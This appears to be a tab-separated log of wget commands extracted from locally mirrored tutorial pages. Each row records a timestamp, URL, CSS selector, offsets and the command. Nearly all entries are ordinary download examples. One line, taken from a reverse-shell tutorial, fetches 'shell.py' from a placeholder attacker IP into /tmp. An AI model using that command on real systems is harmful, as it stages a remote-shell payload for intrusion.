2015-08-25 17:11:34	http://127.0.0.1:8000/pages/wget/bash%20curl%20wget%20tutorial/4/serverfault.com/questions/456490/execute-curl-requests-in-parallel-in-bash.html	HTML > BODY:nth-of-type(1) > DIV:nth-of-type(5) > DIV:nth-of-type(2) > DIV:nth-of-type(1) > DIV:nth-of-type(3) > DIV:nth-of-type(2) > DIV:nth-of-type(4) > TABLE:nth-of-type(1) > TBODY:nth-of-type(1) > TR:nth-of-type(1) > TD:nth-of-type(2) > DIV:nth-of-type(1) > PRE:nth-of-type(1) > CODE:nth-of-type(1)	0	46	wget -nv http://en.wikipedia.org/wiki/Linux -O-
2015-08-25 17:11:39	http://127.0.0.1:8000/pages/wget/curl%20lynx%20wget%20tutorial/9/www.commandlinefu.com/commands/view/1811/dump-http-header-using-wget.html	HTML > BODY:nth-of-type(1) > DIV:nth-of-type(1) > DIV:nth-of-type(4) > DIV:nth-of-type(2) > DIV:nth-of-type(2) > DIV:nth-of-type(1) > DIV:nth-of-type(1)	0	54	wget --server-response --spider http://www.example.com/
2015-08-25 17:12:17	http://127.0.0.1:8000/pages/wget/bash%20curl%20wget%20tutorial/10/gist.github.com/btm/6700524.html	HTML > BODY:nth-of-type(1) > DIV:nth-of-type(1) > DIV:nth-of-type(2) > DIV:nth-of-type(1) > DIV:nth-of-type(2) > DIV:nth-of-type(1) > DIV:nth-of-type(2) > DIV:nth-of-type(2) > DIV:nth-of-type(1) > DIV:nth-of-type(3) > DIV:nth-of-type(1) > ARTICLE:nth-of-type(1) > PRE:nth-of-type(2) > CODE:nth-of-type(1)	0	43	wget https://www.opscode.com/chef/install.sh
2015-08-25 17:12:17	http://127.0.0.1:8000/pages/wget/bash%20curl%20wget%20tutorial/10/gist.github.com/btm/6700524.html	HTML > BODY:nth-of-type(1) > DIV:nth-of-type(1) > DIV:nth-of-type(2) > DIV:nth-of-type(1) > DIV:nth-of-type(2) > DIV:nth-of-type(1) > DIV:nth-of-type(2) > DIV:nth-of-type(2) > DIV:nth-of-type(1) > DIV:nth-of-type(3) > DIV:nth-of-type(1) > ARTICLE:nth-of-type(1) > PRE:nth-of-type(3) > CODE:nth-of-type(1)	160	205	wget https://www.somewhere.com/chef/source.tgz
2015-08-25 17:12:17	http://127.0.0.1:8000/pages/wget/bash%20curl%20wget%20tutorial/10/gist.github.com/btm/6700524.html	HTML > BODY:nth-of-type(1) > DIV:nth-of-type(1) > DIV:nth-of-type(2) > DIV:nth-of-type(1) > DIV:nth-of-type(2) > DIV:nth-of-type(1) > DIV:nth-of-type(2) > DIV:nth-of-type(2) > DIV:nth-of-type(1) > DIV:nth-of-type(3) > DIV:nth-of-type(1) > ARTICLE:nth-of-type(1) > PRE:nth-of-type(4) > CODE:nth-of-type(1)	0	83	wget https://www.somewhere.com/chef/install-ubuntu-12.04-x86.deb -O /tmp/install.deb
2015-08-25 17:12:17	http://127.0.0.1:8000/pages/wget/bash%20curl%20wget%20tutorial/10/gist.github.com/btm/6700524.html	HTML > BODY:nth-of-type(1) > DIV:nth-of-type(1) > DIV:nth-of-type(2) > DIV:nth-of-type(1) > DIV:nth-of-type(2) > DIV:nth-of-type(1) > DIV:nth-of-type(2) > DIV:nth-of-type(2) > DIV:nth-of-type(1) > DIV:nth-of-type(3) > DIV:nth-of-type(1) > ARTICLE:nth-of-type(1) > PRE:nth-of-type(4) > CODE:nth-of-type(1)	142	221	wget https://www.somewhere.com/chef/install-centos-6-x86.rpm -O /tmp/install.rpm
2015-08-25 17:12:18	http://127.0.0.1:8000/pages/wget/java%20linux%20wget%20tutorial/10/www3.math.tu-berlin.de/jreality/mediawiki/index.php/Command-line-tutorial.html	HTML > BODY:nth-of-type(1) > DIV:nth-of-type(3) > DIV:nth-of-type(1) > DIV:nth-of-type(4) > PRE:nth-of-type(5)	3	74	wget http://www3.math.tu-berlin.de/jreality/download/latest/jReality.jar
2015-08-25 17:12:18	http://127.0.0.1:8000/pages/wget/java%20linux%20wget%20tutorial/10/www3.math.tu-berlin.de/jreality/mediawiki/index.php/Command-line-tutorial.html	HTML > BODY:nth-of-type(1) > DIV:nth-of-type(3) > DIV:nth-of-type(1) > DIV:nth-of-type(4) > PRE:nth-of-type(5)	79	159	wget http://www3.math.tu-berlin.de/jreality/download/latest/jReality-tutorial.zip
2015-08-25 17:12:18	http://127.0.0.1:8000/pages/wget/java%20linux%20wget%20tutorial/10/www3.math.tu-berlin.de/jreality/mediawiki/index.php/Command-line-tutorial.html	HTML > BODY:nth-of-type(1) > DIV:nth-of-type(3) > DIV:nth-of-type(1) > DIV:nth-of-type(4) > PRE:nth-of-type(5)	164	245	wget http://www3.math.tu-berlin.de/jreality/download/latest/jReality-3rd-party.zip
2015-08-25 17:12:18	http://127.0.0.1:8000/pages/wget/java%20linux%20wget%20tutorial/10/www3.math.tu-berlin.de/jreality/mediawiki/index.php/Command-line-tutorial.html	HTML > BODY:nth-of-type(1) > DIV:nth-of-type(3) > DIV:nth-of-type(1) > DIV:nth-of-type(4) > PRE:nth-of-type(5)	250	311	wget http://www3.math.tu-berlin.de/jreality/ws/data/vrData.jar
2015-08-25 17:12:18	http://127.0.0.1:8000/pages/wget/java%20linux%20wget%20tutorial/10/www3.math.tu-berlin.de/jreality/mediawiki/index.php/Command-line-tutorial.html	HTML > BODY:nth-of-type(1) > DIV:nth-of-type(3) > DIV:nth-of-type(1) > DIV:nth-of-type(4) > PRE:nth-of-type(13)	2	75	wget http://www3.math.tu-berlin.de/jreality/webstart/ws/jogl2/jogl-all.jar
2015-08-25 17:12:18	http://127.0.0.1:8000/pages/wget/java%20linux%20wget%20tutorial/10/www3.math.tu-berlin.de/jreality/mediawiki/index.php/Command-line-tutorial.html	HTML > BODY:nth-of-type(1) > DIV:nth-of-type(3) > DIV:nth-of-type(1) > DIV:nth-of-type(4) > PRE:nth-of-type(13)	79	154	wget http://www3.math.tu-berlin.de/jreality/webstart/ws/jogl2/gluegen-rt.jar
2015-08-25 17:12:18	http://127.0.0.1:8000/pages/wget/java%20linux%20wget%20tutorial/10/www3.math.tu-berlin.de/jreality/mediawiki/index.php/Command-line-tutorial.html	HTML > BODY:nth-of-type(1) > DIV:nth-of-type(3) > DIV:nth-of-type(1) > DIV:nth-of-type(4) > PRE:nth-of-type(15)	2	95	wget http://www3.math.tu-berlin.de/jreality/webstart/ws/jogl2/jogl-all-natives-linux-amd64.jar
2015-08-25 17:12:18	http://127.0.0.1:8000/pages/wget/java%20linux%20wget%20tutorial/10/www3.math.tu-berlin.de/jreality/mediawiki/index.php/Command-line-tutorial.html	HTML > BODY:nth-of-type(1) > DIV:nth-of-type(3) > DIV:nth-of-type(1) > DIV:nth-of-type(4) > PRE:nth-of-type(15)	99	194	wget http://www3.math.tu-berlin.de/jreality/webstart/ws/jogl2/gluegen-rt-natives-linux-amd64.jar
2015-08-25 17:12:33	http://127.0.0.1:8000/pages/wget/php%20shell%20wget%20tutorial/5/www.cyberciti.biz/tips/linux-wget-your-ultimate-command-line-downloader.html	HTML > BODY:nth-of-type(1) > DIV:nth-of-type(1) > DIV:nth-of-type(2) > DIV:nth-of-type(1) > DIV:nth-of-type(1) > DIV:nth-of-type(2) > P:nth-of-type(3) > CODE:nth-of-type(1)	2	47	wget http://www.cyberciti.biz/here/lsst.tar.gz
2015-08-25 17:12:33	http://127.0.0.1:8000/pages/wget/php%20shell%20wget%20tutorial/5/www.cyberciti.biz/tips/linux-wget-your-ultimate-command-line-downloader.html	HTML > BODY:nth-of-type(1) > DIV:nth-of-type(1) > DIV:nth-of-type(2) > DIV:nth-of-type(1) > DIV:nth-of-type(1) > DIV:nth-of-type(2) > P:nth-of-type(3) > CODE:nth-of-type(1)	51	91	wget ftp://ftp.freebsd.org/pub/sys.tar.gz
2015-08-25 17:12:33	http://127.0.0.1:8000/pages/wget/php%20shell%20wget%20tutorial/5/www.cyberciti.biz/tips/linux-wget-your-ultimate-command-line-downloader.html	HTML > BODY:nth-of-type(1) > DIV:nth-of-type(1) > DIV:nth-of-type(2) > DIV:nth-of-type(1) > DIV:nth-of-type(1) > DIV:nth-of-type(2) > P:nth-of-type(3) > CODE:nth-of-type(1)	95	160	wget -O output.file http://nixcraft.com/some/path/file.name.tar.gz
2015-08-25 17:12:33	http://127.0.0.1:8000/pages/wget/php%20shell%20wget%20tutorial/5/www.cyberciti.biz/tips/linux-wget-your-ultimate-command-line-downloader.html	HTML > BODY:nth-of-type(1) > DIV:nth-of-type(1) > DIV:nth-of-type(2) > DIV:nth-of-type(1) > DIV:nth-of-type(1) > DIV:nth-of-type(2) > P:nth-of-type(3) > CODE:nth-of-type(1)	164	244	wget http://www.kernel.org/pub/linux/kernel/v2.6/testing/linux-2.6.36-rc3.tar.bz2
2015-08-25 17:12:33	http://127.0.0.1:8000/pages/wget/php%20shell%20wget%20tutorial/5/www.cyberciti.biz/tips/linux-wget-your-ultimate-command-line-downloader.html	HTML > BODY:nth-of-type(1) > DIV:nth-of-type(1) > DIV:nth-of-type(2) > DIV:nth-of-type(1) > DIV:nth-of-type(1) > DIV:nth-of-type(2) > P:nth-of-type(7) > CODE:nth-of-type(1)	2	26	wget -i /tmp/download.txt
2015-08-25 17:12:33	http://127.0.0.1:8000/pages/wget/php%20shell%20wget%20tutorial/5/www.cyberciti.biz/tips/linux-wget-your-ultimate-command-line-downloader.html	HTML > BODY:nth-of-type(1) > DIV:nth-of-type(1) > DIV:nth-of-type(2) > DIV:nth-of-type(1) > DIV:nth-of-type(1) > DIV:nth-of-type(2) > P:nth-of-type(8) > CODE:nth-of-type(1)	2	54	wget -c http://www.cyberciti.biz/download/lsst.tar.gz
2015-08-25 17:12:33	http://127.0.0.1:8000/pages/wget/php%20shell%20wget%20tutorial/5/www.cyberciti.biz/tips/linux-wget-your-ultimate-command-line-downloader.html	HTML > BODY:nth-of-type(1) > DIV:nth-of-type(1) > DIV:nth-of-type(2) > DIV:nth-of-type(1) > DIV:nth-of-type(1) > DIV:nth-of-type(2) > P:nth-of-type(8) > CODE:nth-of-type(1)	58	86	wget -c -i  /tmp/download.txt
2015-08-25 17:12:33	http://127.0.0.1:8000/pages/wget/php%20shell%20wget%20tutorial/5/www.cyberciti.biz/tips/linux-wget-your-ultimate-command-line-downloader.html	HTML > BODY:nth-of-type(1) > DIV:nth-of-type(1) > DIV:nth-of-type(2) > DIV:nth-of-type(1) > DIV:nth-of-type(1) > DIV:nth-of-type(2) > P:nth-of-type(9) > CODE:nth-of-type(1)	2	51	wget -cb -o /tmp/download.log -i /tmp/download.txt
2015-08-25 17:12:33	http://127.0.0.1:8000/pages/wget/php%20shell%20wget%20tutorial/5/www.cyberciti.biz/tips/linux-wget-your-ultimate-command-line-downloader.html	HTML > BODY:nth-of-type(1) > DIV:nth-of-type(1) > DIV:nth-of-type(2) > DIV:nth-of-type(1) > DIV:nth-of-type(1) > DIV:nth-of-type(2) > P:nth-of-type(9) > CODE:nth-of-type(2)	8	56	wget -c -o /tmp/download.log -i /tmp/download.txt
2015-08-25 17:12:34	http://127.0.0.1:8000/pages/wget/php%20shell%20wget%20tutorial/5/www.cyberciti.biz/tips/linux-wget-your-ultimate-command-line-downloader.html	HTML > BODY:nth-of-type(1) > DIV:nth-of-type(1) > DIV:nth-of-type(2) > DIV:nth-of-type(1) > DIV:nth-of-type(1) > DIV:nth-of-type(2) > P:nth-of-type(9)	28	170	wget to go into background immediately after startup.  If no output file is specified via the -o option, output is redirected to wget-log file:
2015-08-25 17:12:34	http://127.0.0.1:8000/pages/wget/php%20shell%20wget%20tutorial/5/www.cyberciti.biz/tips/linux-wget-your-ultimate-command-line-downloader.html	HTML > BODY:nth-of-type(1) > DIV:nth-of-type(1) > DIV:nth-of-type(2) > DIV:nth-of-type(1) > DIV:nth-of-type(1) > DIV:nth-of-type(2) > P:nth-of-type(10) > CODE:nth-of-type(1)	2	84	wget -c -o /tmp/susedvd.log --limit-rate=50k ftp://ftp.novell.com/pub/suse/dvd1.iso
2015-08-25 17:12:34	http://127.0.0.1:8000/pages/wget/php%20shell%20wget%20tutorial/5/www.cyberciti.biz/tips/linux-wget-your-ultimate-command-line-downloader.html	HTML > BODY:nth-of-type(1) > DIV:nth-of-type(1) > DIV:nth-of-type(2) > DIV:nth-of-type(1) > DIV:nth-of-type(1) > DIV:nth-of-type(2) > P:nth-of-type(10) > CODE:nth-of-type(2)	2	64	wget -cb -o /tmp/download.log -i /tmp/download.txt --quota=100m
2015-08-25 17:12:34	http://127.0.0.1:8000/pages/wget/php%20shell%20wget%20tutorial/5/www.cyberciti.biz/tips/linux-wget-your-ultimate-command-line-downloader.html	HTML > BODY:nth-of-type(1) > DIV:nth-of-type(1) > DIV:nth-of-type(2) > DIV:nth-of-type(1) > DIV:nth-of-type(1) > DIV:nth-of-type(2) > P:nth-of-type(11) > CODE:nth-of-type(1)	2	88	wget --http-user=vivek --http-password=Secrete  http://cyberciti.biz/vivek/csits.tar.gz
2015-08-25 17:12:34	http://127.0.0.1:8000/pages/wget/php%20shell%20wget%20tutorial/5/www.cyberciti.biz/tips/linux-wget-your-ultimate-command-line-downloader.html	HTML > BODY:nth-of-type(1) > DIV:nth-of-type(1) > DIV:nth-of-type(2) > DIV:nth-of-type(1) > DIV:nth-of-type(1) > DIV:nth-of-type(2) > PRE:nth-of-type(3)	149	239	wget http://test:test@www.kernel.org/pub/linux/kernel/v2.6/testing/linux-2.6.36-rc3.tar.bz2
2015-08-25 17:12:34	http://127.0.0.1:8000/pages/wget/php%20shell%20wget%20tutorial/5/www.cyberciti.biz/tips/linux-wget-your-ultimate-command-line-downloader.html	HTML > BODY:nth-of-type(1) > DIV:nth-of-type(1) > DIV:nth-of-type(2) > DIV:nth-of-type(1) > DIV:nth-of-type(1) > DIV:nth-of-type(2) > PRE:nth-of-type(3)	306	399	wget -b http://test:test@www.kernel.org/pub/linux/kernel/v2.6/testing/linux-2.6.36-rc3.tar.bz2
2015-08-25 17:12:34	http://127.0.0.1:8000/pages/wget/php%20shell%20wget%20tutorial/5/www.cyberciti.biz/tips/linux-wget-your-ultimate-command-line-downloader.html	HTML > BODY:nth-of-type(1) > DIV:nth-of-type(1) > DIV:nth-of-type(2) > DIV:nth-of-type(1) > DIV:nth-of-type(1) > DIV:nth-of-type(2) > P:nth-of-type(13) > CODE:nth-of-type(1)	3	44	wget ftp://somedom.com/pub/downloads/*.pdf
2015-08-25 17:12:34	http://127.0.0.1:8000/pages/wget/php%20shell%20wget%20tutorial/5/www.cyberciti.biz/tips/linux-wget-your-ultimate-command-line-downloader.html	HTML > BODY:nth-of-type(1) > DIV:nth-of-type(1) > DIV:nth-of-type(2) > DIV:nth-of-type(1) > DIV:nth-of-type(1) > DIV:nth-of-type(2) > P:nth-of-type(13) > CODE:nth-of-type(1)	49	90	wget ftp://somedom.com/pub/downloads/*.pdf
2015-08-25 17:12:34	http://127.0.0.1:8000/pages/wget/php%20shell%20wget%20tutorial/5/www.cyberciti.biz/tips/linux-wget-your-ultimate-command-line-downloader.html	HTML > BODY:nth-of-type(1) > DIV:nth-of-type(1) > DIV:nth-of-type(2) > DIV:nth-of-type(1) > DIV:nth-of-type(2) > UL:nth-of-type(1) > LI:nth-of-type(2) > DIV:nth-of-type(2) > P:nth-of-type(2)	79	94	wget -i list.txt
2015-08-25 17:12:34	http://127.0.0.1:8000/pages/wget/php%20shell%20wget%20tutorial/5/www.cyberciti.biz/tips/linux-wget-your-ultimate-command-line-downloader.html	HTML > BODY:nth-of-type(1) > DIV:nth-of-type(1) > DIV:nth-of-type(2) > DIV:nth-of-type(1) > DIV:nth-of-type(2) > UL:nth-of-type(1) > LI:nth-of-type(4) > DIV:nth-of-type(2) > P:nth-of-type(2)	0	51	wget -c -r  –passive-ftp -nH ftp://:@//ftp_dir/*.zip
2015-08-25 17:12:34	http://127.0.0.1:8000/pages/wget/php%20shell%20wget%20tutorial/5/www.cyberciti.biz/tips/linux-wget-your-ultimate-command-line-downloader.html	HTML > BODY:nth-of-type(1) > DIV:nth-of-type(1) > DIV:nth-of-type(2) > DIV:nth-of-type(1) > DIV:nth-of-type(2) > UL:nth-of-type(1) > LI:nth-of-type(9) > UL:nth-of-type(1) > LI:nth-of-type(1) > DIV:nth-of-type(2) > P:nth-of-type(1) > CODE:nth-of-type(1)	0	45	wget -O output.pdf http://example.com/file.pdf
2015-08-25 17:12:34	http://127.0.0.1:8000/pages/wget/php%20shell%20wget%20tutorial/5/www.cyberciti.biz/tips/linux-wget-your-ultimate-command-line-downloader.html	HTML > BODY:nth-of-type(1) > DIV:nth-of-type(1) > DIV:nth-of-type(2) > DIV:nth-of-type(1) > DIV:nth-of-type(2) > UL:nth-of-type(1) > LI:nth-of-type(13) > DIV:nth-of-type(2) > P:nth-of-type(1)	109	154	wget http://www.cyberciti.biz/here/lsst.tar.gz
2015-08-25 17:12:34	http://127.0.0.1:8000/pages/wget/php%20shell%20wget%20tutorial/5/www.cyberciti.biz/tips/linux-wget-your-ultimate-command-line-downloader.html	HTML > BODY:nth-of-type(1) > DIV:nth-of-type(1) > DIV:nth-of-type(2) > DIV:nth-of-type(1) > DIV:nth-of-type(2) > UL:nth-of-type(1) > LI:nth-of-type(16) > DIV:nth-of-type(2) > P:nth-of-type(1)	45	71	wget -c “url1″ -O image.iso
2015-08-25 17:12:35	http://127.0.0.1:8000/pages/wget/curl%20python%20wget%20tutorial/6/superuser.com/questions/444437/grab-source-from-google-code-using-wget-or-curl.html	HTML > BODY:nth-of-type(1) > DIV:nth-of-type(5) > DIV:nth-of-type(2) > DIV:nth-of-type(1) > DIV:nth-of-type(3) > DIV:nth-of-type(2) > DIV:nth-of-type(2) > TABLE:nth-of-type(1) > TBODY:nth-of-type(1) > TR:nth-of-type(1) > TD:nth-of-type(2) > DIV:nth-of-type(1) > PRE:nth-of-type(1) > CODE:nth-of-type(1)	0	59	wget --mirror https://typo3scripts.googlecode.com/svn/trunk/
2015-08-25 17:12:57	http://127.0.0.1:8000/pages/wget/python%20subprocess%20wget%20tutorial/7/www.primalsecurity.net/0x2-python-tutorial-reverse-shell/	HTML > BODY:nth-of-type(1) > DIV:nth-of-type(3) > DIV:nth-of-type(1) > DIV:nth-of-type(1) > DIV:nth-of-type(2) > DIV:nth-of-type(2) > DIV:nth-of-type(1) > TABLE:nth-of-type(1) > TBODY:nth-of-type(1) > TR:nth-of-type(1) > TD:nth-of-type(2) > DIV:nth-of-type(1) > DIV:nth-of-type(2)	0	50	wget -O /tmp/shell.py http://_attacker_ip_/shell.py
2015-08-25 17:14:11	http://127.0.0.1:8000/pages/wget/download%20python%20wget%20tutorial/6/programminghistorian.org/lessons/applied-archival-downloading-with-wget.html	HTML > BODY:nth-of-type(1) > DIV:nth-of-type(1) > ARTICLE:nth-of-type(1) > DIV:nth-of-type(1) > DIV:nth-of-type(5) > PRE:nth-of-type(1) > CODE:nth-of-type(1)	0	57	wget -i urls.txt -r --no-parent -nd -w 2 --limit-rate=100k
2015-08-25 17:14:13	http://127.0.0.1:8000/pages/wget/download%20python%20wget%20tutorial/6/programminghistorian.org/lessons/applied-archival-downloading-with-wget.html	HTML > BODY:nth-of-type(1) > DIV:nth-of-type(1) > ARTICLE:nth-of-type(1) > DIV:nth-of-type(1) > DIV:nth-of-type(7) > PRE:nth-of-type(1) > CODE:nth-of-type(1)	0	57	wget -i urls.txt -r --no-parent -nd -w 2 --limit-rate=100k
2015-08-25 17:14:15	http://127.0.0.1:8000/pages/wget/download%20python%20wget%20tutorial/6/programminghistorian.org/lessons/applied-archival-downloading-with-wget.html	HTML > BODY:nth-of-type(1) > DIV:nth-of-type(1) > ARTICLE:nth-of-type(1) > DIV:nth-of-type(1) > DIV:nth-of-type(8) > PRE:nth-of-type(1) > CODE:nth-of-type(1)	0	77	wget –i Jefferson.txt –r --no-parent -nd –w 2 –A .jpg, .jpeg --limit-rate=100k
2015-08-25 17:24:04	http://127.0.0.1:8000/pages/wget/bash%20grep%20wget%20tutorial/10/ubuntuforums.org/archive/index.php/t-60303.html	HTML > BODY:nth-of-type(1) > DIV:nth-of-type(1) > DIV:nth-of-type(4) > DIV:nth-of-type(2)	795	875	wget -c http://kent.dl.sourceforge.net/sourceforge/inkscape/Inkscape-0.42.2-0.dmg
2015-08-25 17:24:30	http://127.0.0.1:8000/pages/wget/linux%20unix%20wget%20tutorial/4/www.linuxtechi.com/wget-command-practical-examples/	HTML > BODY:nth-of-type(1) > DIV:nth-of-type(1) > DIV:nth-of-type(1) > DIV:nth-of-type(1) > MAIN:nth-of-type(1) > ARTICLE:nth-of-type(1) > DIV:nth-of-type(1) > PRE:nth-of-type(3)	24	84	wget -b http://mirror.nbrc.ac.in/centos/7.0.1406/isos/x86_64/
2015-08-25 17:24:30	http://127.0.0.1:8000/pages/wget/bash%20ftp%20wget%20tutorial/5/serverfault.com/questions/357576/ftp-file-download-using-wget.html	HTML > BODY:nth-of-type(1) > DIV:nth-of-type(5) > DIV:nth-of-type(2) > DIV:nth-of-type(1) > DIV:nth-of-type(3) > DIV:nth-of-type(1) > TABLE:nth-of-type(1) > TBODY:nth-of-type(1) > TR:nth-of-type(1) > TD:nth-of-type(2) > DIV:nth-of-type(1) > DIV:nth-of-type(1) > P:nth-of-type(3)	6	17	wget command
2015-08-25 17:24:37	http://127.0.0.1:8000/pages/wget/bash%20ftp%20wget%20tutorial/5/serverfault.com/questions/357576/ftp-file-download-using-wget.html	HTML > BODY:nth-of-type(1) > DIV:nth-of-type(5) > DIV:nth-of-type(2) > DIV:nth-of-type(1) > DIV:nth-of-type(3) > DIV:nth-of-type(1) > TABLE:nth-of-type(1) > TBODY:nth-of-type(1) > TR:nth-of-type(1) > TD:nth-of-type(2) > DIV:nth-of-type(1) > DIV:nth-of-type(1) > PRE:nth-of-type(1) > CODE:nth-of-type(1)	0	47	wget -r ftp://username:password@ip/directoryname
2015-08-25 17:24:42	http://127.0.0.1:8000/pages/wget/linux%20unix%20wget%20tutorial/4/www.linuxtechi.com/wget-command-practical-examples/	HTML > BODY:nth-of-type(1) > DIV:nth-of-type(1) > DIV:nth-of-type(1) > DIV:nth-of-type(1) > MAIN:nth-of-type(1) > DIV:nth-of-type(1) > OL:nth-of-type(1) > LI:nth-of-type(1) > ARTICLE:nth-of-type(1) > DIV:nth-of-type(1) > P:nth-of-type(1) > CODE:nth-of-type(1)	0	46	wget -q -O - http://wordpress.org/latest.tar.gz
2015-08-25 17:25:02	http://127.0.0.1:8000/pages/wget/bash%20ftp%20wget%20tutorial/5/serverfault.com/questions/357576/ftp-file-download-using-wget.html	HTML > BODY:nth-of-type(1) > DIV:nth-of-type(5) > DIV:nth-of-type(2) > DIV:nth-of-type(1) > DIV:nth-of-type(3) > DIV:nth-of-type(2) > DIV:nth-of-type(2) > TABLE:nth-of-type(1) > TBODY:nth-of-type(1) > TR:nth-of-type(1) > TD:nth-of-type(2) > DIV:nth-of-type(1) > PRE:nth-of-type(1) > CODE:nth-of-type(1)	0	49	wget -r 'ftp://username:password@ip/directoryname'
2015-08-25 18:44:06	http://127.0.0.1:8000/pages/wget/linux%20web-crawler%20wget%20tutorial/6/linuxreviews.org/quicktips/wget/	HTML > BODY:nth-of-type(1) > TABLE:nth-of-type(1) > TBODY:nth-of-type(1) > TR:nth-of-type(2) > TD:nth-of-type(2) > TABLE:nth-of-type(1) > TBODY:nth-of-type(1) > TR:nth-of-type(1) > TD:nth-of-type(1) > DIV:nth-of-type(1) > P:nth-of-type(2) > CODE:nth-of-type(1)	0	7	wget url
2015-08-25 18:44:32	http://127.0.0.1:8000/pages/wget/mysql%20php%20wget%20tutorial/5/rtcamp.com/tutorials/monitoring/newrelic/	HTML > BODY:nth-of-type(1) > DIV:nth-of-type(1) > DIV:nth-of-type(1) > DIV:nth-of-type(2) > MAIN:nth-of-type(1) > DIV:nth-of-type(2) > PRE:nth-of-type(1) > CODE:nth-of-type(1)	0	50	wget -O - http://download.newrelic.com/548C16BF.gpg
2015-08-25 18:44:33	http://127.0.0.1:8000/pages/wget/linux%20web-crawler%20wget%20tutorial/6/linuxreviews.org/quicktips/wget/	HTML > BODY:nth-of-type(1) > TABLE:nth-of-type(1) > TBODY:nth-of-type(1) > TR:nth-of-type(2) > TD:nth-of-type(2) > TABLE:nth-of-type(1) > TBODY:nth-of-type(1) > TR:nth-of-type(1) > TD:nth-of-type(1) > DIV:nth-of-type(1) > P:nth-of-type(3) > CODE:nth-of-type(1)	0	28	wget http://linuxreviews.org/
2015-08-25 18:44:40	http://127.0.0.1:8000/pages/wget/mysql%20php%20wget%20tutorial/5/rtcamp.com/tutorials/monitoring/newrelic/	HTML > BODY:nth-of-type(1) > DIV:nth-of-type(1) > DIV:nth-of-type(1) > DIV:nth-of-type(2) > MAIN:nth-of-type(1) > DIV:nth-of-type(2) > PRE:nth-of-type(15) > CODE:nth-of-type(1)	0	91	wget https://rpm.newrelic.com/plugins/52/6d5832e3a0ca0ee6e2cf45da8d0da170 -O nr-mysql.tar.gz
2015-08-25 18:44:41	http://127.0.0.1:8000/pages/wget/linux%20web-crawler%20wget%20tutorial/6/linuxreviews.org/quicktips/wget/	HTML > BODY:nth-of-type(1) > TABLE:nth-of-type(1) > TBODY:nth-of-type(1) > TR:nth-of-type(2) > TD:nth-of-type(2) > TABLE:nth-of-type(1) > TBODY:nth-of-type(1) > TR:nth-of-type(1) > TD:nth-of-type(1) > DIV:nth-of-type(1) > P:nth-of-type(5) > CODE:nth-of-type(1)	0	31	wget -r http://linuxreviews.org/
2015-08-25 18:45:03	http://127.0.0.1:8000/pages/wget/linux%20web-crawler%20wget%20tutorial/6/linuxreviews.org/quicktips/wget/	HTML > BODY:nth-of-type(1) > TABLE:nth-of-type(1) > TBODY:nth-of-type(1) > TR:nth-of-type(2) > TD:nth-of-type(2) > TABLE:nth-of-type(1) > TBODY:nth-of-type(1) > TR:nth-of-type(1) > TD:nth-of-type(1) > DIV:nth-of-type(1) > PRE:nth-of-type(1)	2	69	wget  -r -p -U Mozilla http://www.stupidsite.com/restricedplace.html
2015-08-25 18:45:05	http://127.0.0.1:8000/pages/wget/java%20linux%20wget%20tutorial/2/introcs.cs.princeton.edu/java/linux/	HTML > BODY:nth-of-type(1) > DIV:nth-of-type(2) > UL:nth-of-type(1) > LI:nth-of-type(5) > BLOCKQUOTE:nth-of-type(1) > TABLE:nth-of-type(1) > TBODY:nth-of-type(1) > TR:nth-of-type(1) > TD:nth-of-type(1) > PRE:nth-of-type(1)	22	79	wget http://introcs.cs.princeton.edu/java/linux/drjava.jar
2015-08-25 18:45:07	http://127.0.0.1:8000/pages/wget/linux%20web-crawler%20wget%20tutorial/6/linuxreviews.org/quicktips/wget/	HTML > BODY:nth-of-type(1) > TABLE:nth-of-type(1) > TBODY:nth-of-type(1) > TR:nth-of-type(2) > TD:nth-of-type(2) > TABLE:nth-of-type(1) > TBODY:nth-of-type(1) > TR:nth-of-type(1) > TD:nth-of-type(1) > DIV:nth-of-type(1) > P:nth-of-type(10) > CODE:nth-of-type(1)	0	93	wget --wait=20 --limit-rate=20K -r -p -U Mozilla http://www.stupidsite.com/restricedplace.html
2015-08-25 18:45:13	http://127.0.0.1:8000/pages/wget/java%20linux%20wget%20tutorial/2/introcs.cs.princeton.edu/java/linux/	HTML > BODY:nth-of-type(1) > DIV:nth-of-type(2) > UL:nth-of-type(1) > LI:nth-of-type(5) > BLOCKQUOTE:nth-of-type(1) > TABLE:nth-of-type(1) > TBODY:nth-of-type(1) > TR:nth-of-type(1) > TD:nth-of-type(1) > PRE:nth-of-type(1)	103	156	wget http://introcs.cs.princeton.edu/java/linux/drjava
